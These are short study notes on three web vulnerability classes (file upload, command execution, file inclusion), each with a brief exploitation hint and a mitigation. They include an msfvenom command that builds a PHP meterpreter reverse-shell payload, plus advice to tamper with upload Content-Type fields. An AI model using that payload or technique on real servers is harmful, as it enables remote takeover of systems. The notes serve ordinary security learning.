File Upload Vulnerabilities
---------------------------
Exploitation : Tamper with Content-Type and Content-Dispositioned fields.
Mitigation : 1) Never allow users to upload executables.
             2) Check file type and file extension.
             3) Analyse the uploaded file, recreate it and rename it. 
PHP Reverse Shell -> msfvenom -p php/meterpreter_reverse_tcp LHOST=<> LPORT=<> -f raw > my_shell.php

Command Execution Vulnerabilities
---------------------------------
Allows an attacker to execute OS specific commands.
Attackers can get reverse shell. (see reverse shell commands: bash, perl python, php, ruby, nc etc)
Mitigation : 1) Don't use dangerous functions.
             2) Input validation before execution.

File Inclusion Vulnerabilities (LFI & RFI)
------------------------------------------
Allows an attacker to read any file.
Mitigation : Use static file inclusion
